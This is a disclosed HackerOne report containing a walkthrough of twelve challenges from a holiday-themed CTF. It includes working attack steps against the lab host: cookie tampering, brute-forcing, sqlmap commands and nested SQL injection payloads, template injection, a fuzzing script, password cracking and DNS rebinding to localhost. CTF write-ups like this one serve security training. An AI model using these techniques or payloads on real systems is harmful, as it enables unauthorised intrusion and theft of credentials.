# Taking Grinch Down To Save Holidays

## Report Details
- **Report ID**: 1067037
- **URL**: https://hackerone.com/reports/1067037
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-27T15:34:37.502Z
- **Disclosed**: 2021-01-22T18:58:18.365Z

## Reporter
- **Username**: akshansh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hi thank you Hackerone and Adam for organizing the CTF, this had honestly helped me to learn good skills and techniques.

The CTF  began with the scope:  hackyholidays.h1ctf.com and mission to take down grinch
So here's a quick visual summary of all the challenges

{F1131175}  {F1131176}


# 1. Grinch Robots
In this challenge we needed to find grinch robots, opening the robots.txt file destroyed the robots and gave us flags


## Steps to reproduce:
1. Go to https://hackyholidays.h1ctf.com/robots.txt
2. In the page you would find the flag
3. ~~Grinch RobotsDown~~

### flag{48104912-28b0-494a-9995-a203d1e261e7}

# 2. s3cr3t-ar3a
In this challenge, we had got a clue from robots.txt about a page s3cr3t-ar3a, Upon visiting the page we see that it displayed page was moved to other location but Grinch forgot about the page source which had jquery.min.js that held the flag in order to get the flag we needed to merge all the pieces which could be easily done from Chrome dev-tools.

{F1131181}

## Steps:
1. Go to https://hackyholidays.h1ctf.com/s3cr3t-ar3a and view page source  
2. In there we can see a js file named jquery.min.js
3. Use a beautifier to easily see contents and now copy the variables from 
``` h1_0='la',h1_1='}',h1_2='',h1_3='f',h1_4='g',h1_5='{b7ebcb75',h1_6='8454-',h1_7='cfb9574459f7',h1_8='-9100-4f91-'  ```
4. In chrome dev console paste this and then enter  ``` h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 ``` this will reveal the flag
5.  ~~Grinch Secrets Exposed~~

###  flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

# 3. People Rater
Grinch has rated people with a lot of hate but he forgot that  by mistake he rated himself and hid the secrets in his ratings,
when we click on any person  ratings we observe that to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= a request is made to fetch every person ratings the id= value is base64 encoded, on the page value starts from {"id":2} to {"id":17} replacing this value with {"id":1} base64 i.e eyJpZCI6MX0=  gave the flag


## Steps to reproduce:
1. Go to https://hackyholidays.h1ctf.com/people-rater, press any name, and observe the background request in burp
2. The request looks like 

```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
```

3. Here upon decoding this value it gives {"id":2}, hmm strange starting value with 2 
4. So i tried {"id":1} encoded eyJpZCI6MX0= and send request again 

{F1131183}

```
Request
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=

Response:
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

``` 
3.~~Grinch Rater Down~~
### flag{b705fb11-fb55-442f-847f-0931be82ed9a}



# 4.Grinch Swag-Shop

Soon after this attack grinch launched his swag shop to ruin the fun, the shop only allowed to access via login at first look after fuzzing a bit I found that the swag-shop was built with API's also so I used my API wordlist for directories fuzzing which gave out /session & /user, session here gave us session values of users {"user,"cookie"} values only among them one had user value since accessing /user was giving missing required field I fuzzed /user with [ARJUN ](https://github.com/s0md3v/Arjun) and got uuid as a parameter so I sent a request as /api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 which gave the flag

{F1131189}

## Steps:
1. Go to  https://hackyholidays.h1ctf.com/swag-shop/api
2.  Now launch the API requests we retrieve flag as shown below


```
REQUEST1
https://hackyholidays.h1ctf.com/swag-shop/api/sessions

RESPONSE1

{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}

DECODED

{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}","{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}","{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}","{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}","{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}","{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}","{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}","{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}

REQUEST2
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

RESPONSE2
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

```

3.~~Grinch Shop Down~~

### flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

# 5.Secure Login
After Grinch swag shop was taken down through Api he  immediately stopped the Api and added only password-based login which he thought was secure we took it down by common Bruteforce list which was listed on Adam's website   ctfchallenge.co.uk, after logging in we found cookie was checking if a user is an admin or not we changed it to true by which we could see a file which was protected by a password but we break into in seconds through frackzip

## Steps:
1. Go to the login page and enter any username password and send it to the intruder now add only the username field. 
2. Now use adam's website common username list and in  intruder, results search for the Invalid password response we found ```access``` as a valid username
{F1131196}

3. Now we use a common password list through which we get ```computer``` as password
4. After login we see a blank page but observing cookies 

{F1131204}

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
we changed it to 
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

5.Now we can see a file name my_secure_files_not_for_you.zip 
6.Even though it was password protected i used the tool fcrackzip using rockyou.txt which gave the password as hahahaha
{F1131198}
7.So we got the flag and took down the Login system of Grinch again
8.~~Grinch Secure Login Down~~

### flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

# 6. Grinch Diary
Grinch had changed his systems and he's now taking a new diary for writing all the bad works he will do, grinch protected secret files through so  its not in our access

Here as soon as we opened the https://hackyholidays.h1ctf.com/my-diary/ the page automatically appended template=entries.html hmm interesting i was using wappalyzer which indicated the page is using PHP so I tried with index.php and gave a blank page upon viewing its source got the code which revealed that our flag was in secretadmin.php since it would not allow directly to access this due to check  

```
$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
``` 

So I prepared a value  secretadmsecretadmadmin.phpin.phpin.php which upon 1st check would leave secretadmsecretadmin.phpin.php & on second check would give us secretadmin.php

## Steps:
1. Go to https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php
2. We get flag as
{F1131268}

3. ~~Burned Grinch Diary~~

### flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

# 7. Hate-Emails

Grinch now came back with a new app which would send hate emails to others he has a special header which only he could include thats what he thinks but he missed to protect the template data check as preview data was lacking check through which we included the header and accessed his mail secrets

On the url  https://hackyholidays.h1ctf.com/hate-mail-generator/ a quick directory search gave us /templates/ which had 3 entries 
```
cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46

```
out of which 38dhs_admins_only_header.html   was forbidden to access if we try to include that  in markdown  as {{template:38dhs_admins_only_header.html}}  this would also not work and give response as ```You do not have access to the file 38dhs_admins_only_header.html```  . The request body that was going contained

```
preview_markup=hIII{{template:cbdj3_grinch_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

Since insertion was not possible directly in preview_markup i tried inserting admin header in preview_data as

```
preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}
```


##Steps:
1. Open the url https://hackyholidays.h1ctf.com/hate-mail-generator/new/  and click on preview
2. Now intercept the request and replace preview data with ``` preview_data={"name":"{{template:38dhs_admins_only_header.html}}```
3. We get our flag in response
{F1131285}
4. ~~Hate Mailing Down~~

### flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}


# 8. Grinch Forum
Grinch upon seeing his mistakes now decided to supersecure his new idea and built a forum for publishing his bad ideas but he was also clever enough to expose some secrets on github and burn himself again.

As landing on the page it seemed secured with functionality of only login and view of posts a quick directory search gave a /phpmyadmin page which looked as custom built bruteforcing both login and phpmyadmin didnt gave any results , hmm but since grinch was clever enough he exposed the code for the forum in his github [Grinch-Network](https://github.com/Grinch-Networks/forum) in one of his old commits
  {F1131310}  
small fix he left dbconnect credentials  
{F1131315}  

which was of phpmyadmin  ``` forum','6HgeAZ0qC9T6CQIqJpD ``` upon login he see a user grinch hash ``` 35D652126CA1706B59DB02C93E0C9FBF```  then i used crackstation to decode the password of grinch which came as ```BahHumbug``` 

 {F1131344}   {F1131343}

and now when we login we get the secret plans post which upon opening gave the flag


## Steps:
1. Go to https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
2. Copy the dbconnect credentials ``` forum','6HgeAZ0qC9T6CQIqJpD ```   and login to https://hackyholidays.h1ctf.com/forum/phpmyadmin
3.  In  phpmyadmin see the users table we can see grinch password hash ```35D652126CA1706B59DB02C93E0C9FBF```
4.  Now copy the hash and paste in https://crackstation.net/ this will give password as  ```BahHumbug```
5. Now simply login with this username and password and browse to https://hackyholidays.h1ctf.com/forum/3/2
{F1131342}
6. ~~ Forum Closed~~

### flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

# 9. Evil-Quiz 
Grinch came with a new app called evil-quiz the app would require you to input your name and then ask questions and at the end tell level of your evilness but he was foolish as he did not used parameterized queries

Upon starting the quiz we see that we are asked to enter a name at the end of the quiz in results we can see
{F1131361} 
that our name was checked against current players and then it returns number of matches this triggered the ideas of second order SQL injection as here the query is not directly fired its fired after event of completing the quiz and it was the case of second order SQL injection sqlmap has a automated way to exploit and dump the tables
and therefore after dumping the database we got login credentials and after login we got the flag.
  
## Steps:
1. First enter open the quiz and copy cookie value
2. Now via sqlmap fire this query 

  ```
 python sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" --dbs"
```

3.This will output as ```quiz``` as a database next for tables we add  --tables -D quiz  to know table name , tebale name of our interest was ```admin```
4.Now to fully dump this quiz database we fire

```
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=admin" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=a6e604306eee610c6cf057555e0a80ff" -T admin -D quiz  --dump
```
Username-admin
Password:S3creT_p4ssw0rd-$

{F1131384}
5.After Login we get the flag
{F1131389}
6.~~Lock Evil-Quiz~~

### flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

# 10.Signup Manager
Grinch launched a signup manager but this time he exposed the source code which helped to find the overflow flaw in input fields and helped to become an admin to get the flag

On visiting the page in source we can see mention of  ```<!-- See README.md for assistance -->``` when we downlaoded [Readme.md](https://hackyholidays.h1ctf.com/signup-manager/README.md{ it was an install guide for this app 
{F1131401} 
so this mentioned to unzip signupmanager.zip which was the source code as we downloaded it we can see all the files but the interesting one was index.php as it holded the logic for signup and admin check, as we could see during signup 

{F1131402}
'N' is automatically appended to line to prevent from user becoming admin if we check 
{F1131426} 
we can see to check wheter a user is admin or not line 113 is checked for Y value if its there then admin access will be granted so we need to pass Y somehow to line 113 the way it can be done here is overflowing age value with exponential value such as 1e9 which equals to 1,000,000,000 since this would feed into line 79 to 89 taking 10 characters note during signup firstname and lastname are given 15 chars limit so 89+30=119 so now we can easily add Y at line 113 just we need to send lastname as YYYYYYYYY and adjust other chars such that line 113 becomes Y.

## Steps:
1. Go to https://hackyholidays.h1ctf.com/signup-manager/
2. Now enter the following payload as request body

```
action=signup&username=adminbb&password=adminbb&age=1e9&firstname=YYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYY
```
3.We get access to flag and next chall url

{F1131432}

### flag{99309f0f-1752-44a5-af1e-a03e4150757d}



# 11. Grinch Double Evil
Grinch became double evil by launching the new app at  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 he tricked the people to believe at first layer injection with rabbit hole but deep down he couldnt protect api and login credentials.


This was the most fun and new learning experience for me at first look we see three Xmas albums request goes to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash= here we had three values and for each value when a request goes image data is returned in form of 

```
/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
``` 

then a  url is then queried again  to fetch that image 

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
```
At first when we tried
After fuzzing with directory search we got /api/
{F1131456} but at this point we really didnt have ideas how to use except get  a response that we cannot visit from our IP after trying an SQL Injection on 
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=  i was like yes but here this single injection was a rabbit hole and didnt returned any useful data only 

```
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

So after a bit waiting at a dead end ,in discord Adam dropped a hint {F1131463} this was from INCEPTION here this meant of  a double dream sequence and clearly for our challenge this meant for SQL Injection as double SQL injection so i tried with

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'1'='0",NULL,"test'"--+-
```
returns only two rows while 
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3230' UNION+ALL+SELECT+"1'+OR+'0'='0",NULL,"test'"--+-
```

returned all the rows now we now needed to include with file names so as test we try /api/  /api/test/

```
1. /api/
Req-a
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=6860'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/\"--+-",NULL,"test'"--+-
Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Response : Invalid content type detected

2. /api/test/
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/test\"--+-",NULL,"test'"--+-

Req-b
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3Rlc3QiLCJhdXRoIjoiOWQ0M2MwMDQ4MjMzNWFiYzhjZmRmNjM3YzAwNWJkZDYifQ==

Response: Expected HTTP status 200, Received: 404
```

So here now we need to fuzz the /api/  i have used 2 files for [ files](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) and [parameters](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt)
since this could not be done by any tool in my knowledge i used a simple python script as:

```
payloads=open('apiwordlist.txt',"r")
sql1='''33230'+UNION+ALL+SELECT+"12'+UNION+ALL+SELECT+1,1,\"../api/'''
sql2='''\"--+-",NULL,"test'"--+-'''
url='https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=+sql1+payloads+sql2'

t1=requests.get(url).text
searchdata=re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", t1).group(1)
t2=requests.get("http://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=+searchdata")

if "Received: 404" not in t2.text:
    print(t2.text, payloads)

```

Now after fuzzing we got ```/user and /ping``` as a directory then again we used this time paramter bruteforcing after /user?+payloads which returned us with ```username and password```  as valid parameters now to exfil the values in api we can use % character which would return us with if value/ like  exists so for that we fuzzed with the same logic in iterations as 
and payloads with alphanumeric  a-z0-9
 username as /api/user?username=a%
password as  /api/user?password=a% which gave values 
```
/api/user?username=grinchadmin%
/api/user?password=s4nt4sucks%
```

Now after this we go to login page https://hackyholidays.h1ctf.com/attack-box and enter these credentials grinchadmin:s4nt4sucks we get our flag and final challenge .

{F1131557}

~~Grinch Recon Server Down~~

### flag{07a03135-9778-4dee-a83c-7ec330728e72}

# 12 Grinch HashingDns

Now Grinch got superfrustrated and decided to launch his final DDOS attack to target he made a script that would launch an attack to ip he restricted it with a check if ip resolves first time as 127.0.0.1 then attack woul be aborted

We began on https://hackyholidays.h1ctf.com/attack-box here we can see three ip and three urls so decoding 1st ip we can see 

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

https://hackyholidays.h1ctf.com/attack-box/launch?payload={"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

each payload has ip and hash base64 encoded together if we manually try to change ip or change hashes the server would respond with
``` Invalid Protection Hash```  so here needed to generate hash for an ip to do so we needed to now hash password that is used server side I tried using hashcat with  hash:salt format to get the password here ip is our salt
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```
this gave us 
{F1131537} mrgrinch463 as password  now if we generate a hash and try IP such as 127.0.0.1 it would stop the attack detecting it as localhost here DNS rebinding will help us at first we need our IP to resolve to any ip other than localhost and then 127.0.0.1 here we use https://lock.cmpxchg8b.com/rebinder.html and enter IP1 as 192.168.0.1 and IP2 as 127.0.0.1 now we generate our hash using [Md5salthash](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) and then we encode the IP and send the payload this gives us back a attack URL upon loading after 2nd resolve this attacks 127.0.0.1 and thus we get our final flag & burn down whole grinch system and save the holidays

## Steps:
1. Using hashcat crack the password with the command
``` hashcat -a 0 -m 10 hash.txt ../../tools/payloads/wordlists/wordlistsl/rockyou.txt --show```
2.  Now we get password as ``` mrgrinch463``` 
3. Now we go to https://lock.cmpxchg8b.com/rebinder.html and generate a url for  dns rebinding 
{F1131540}
we get c0a80001.7f000001.rbndr.us 
4. Now to generate our hash we visit http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php and enter our url and password which generates us a hash of 60ff4921c1c7a927c06140d0a57c9d38 now we base64 encode this as

```
{"target":"c0a80001.7f000001.rbndr.us","hash":"60ff4921c1c7a927c06140d0a57c9d38"}
eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
```

5.Now we send this as payload 
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
```
which redirects us to 
{F1131543}  https://hackyholidays.h1ctf.com/attack-box/launch/d265d7796749f0d1ae59115fc9fef7a2
6.Upon  visiting the url we sucessfullly launch the attack against 127.0.0.1 and destroy grinch networks 
{F1131544}

{F1131545}

7.~~Take Down Grinch~~ 
### flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

...

## Attachments
- oie_27741512O8gRbDW.png
- Screenshot_from_2020-12-27_11-57-22.png
- s3cr3t-ar3a.mp4
- Screenshot_from_2020-12-27_13-17-18.png
- people-rater.webm
- Screenshot_from_2020-12-27_13-30-30.png
- Screenshot_from_2020-12-17_15-48-27.png
- Screenshot_from_2020-12-17_15-34-52.png
- Screenshot_from_2020-12-27_14-24-30.png
- Screenshot_from_2020-12-27_14-52-42.png
- Screenshot_from_2020-12-27_15-24-02.png
- Screenshot_from_2020-12-27_15-13-33.png
- Screenshot_from_2020-12-20_10-31-04.png
- Screenshot_from_2020-12-20_10-29-14.png
- Screenshot_from_2020-12-20_10-29-04.png
- Screenshot_from_2020-12-27_16-16-35.png
- Screenshot_from_2020-12-21_14-53-38.png
- Screenshot_from_2020-12-27_17-01-01.png
- Screenshot_from_2020-12-27_17-02-30.png
- Screenshot_from_2020-12-27_17-05-39.png
- Screenshot_from_2020-12-27_17-37-25.png
- Screenshot_from_2020-12-27_17-58-20.png
- Screenshot_from_2020-12-27_18-19-55.png
- Screenshot_from_2020-12-23_14-19-33.png
- Screenshot_from_2020-12-27_20-14-03.png
- Screenshot_from_2020-12-27_20-25-52.png
- Screenshot_from_2020-12-27_20-28-46.png
- Screenshot_from_2020-12-27_20-29-52.png
- Screenshot_from_2020-12-27_20-31-32.png
- Screenshot_from_2020-12-27_18-23-21.png
